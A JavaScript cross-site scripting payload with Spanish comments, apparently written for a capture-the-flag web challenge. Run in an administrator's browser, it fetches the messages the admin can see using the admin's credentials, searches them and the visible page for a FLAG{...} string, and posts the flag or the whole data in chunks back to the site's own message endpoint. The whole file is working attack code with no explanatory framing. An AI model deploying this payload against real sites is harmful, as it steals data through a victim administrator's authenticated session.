// navaja.js — exfil same-origin vía /create_msg
(async () => {
  const postMsg = async (message) => {
    try {
      await fetch('/create_msg', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message })
      });
    } catch (e) { /* silencio */ }
  };

  try {
    // 1) Determina el endpoint que está viendo el admin (con o sin ?id=)
    const qs = new URLSearchParams(location.search);
    const id = qs.get('id');
    const endpoint = id ? `/messages?id=${encodeURIComponent(id)}` : `/messages`;

    // 2) Pide los mensajes que ve el admin
    const r = await fetch(endpoint, { credentials: 'include' });
    const data = await r.json(); // { messages: [ {id, message}, ... ] }

    // 3) Intenta localizar una FLAG{...} en cualquier mensaje o en el body visible
    const allText = JSON.stringify(data);
    const fromDom = (document.body && document.body.innerText) ? document.body.innerText : '';
    const m = (allText + '\n' + fromDom).match(/FLAG\{[^}]+\}/i);

    if (m && m[0]) {
      await postMsg(`EXFIL_FLAG: ${m[0]}`);
      return;
    }

    // 4) Si no hay flag, postea todo el JSON en trozos para no desbordar
    const payload = allText;
    const CHUNK = 900; // margen para el JSON.stringify del servidor
    let idx = 0, part = 0;
    while (idx < payload.length && part < 10) { // limita a 10 trozos por prudencia
      const slice = payload.slice(idx, idx + CHUNK);
      await postMsg(`EXFIL_PART_${part}: ${slice}`);
      idx += CHUNK;
      part += 1;
    }

    // 5) También envía un resumen visible del panel (texto plano)
    if (fromDom && fromDom.trim()) {
      const snip = fromDom.slice(0, 1500);
      await postMsg(`EXFIL_DOM_SNIP: ${snip}`);
    }
  } catch (e) {
    // Como último recurso, deja un rastro de error para debug en el panel
    try { await postMsg(`EXFIL_ERR: ${e && e.message ? e.message : String(e)}`); } catch {}
  }
})();
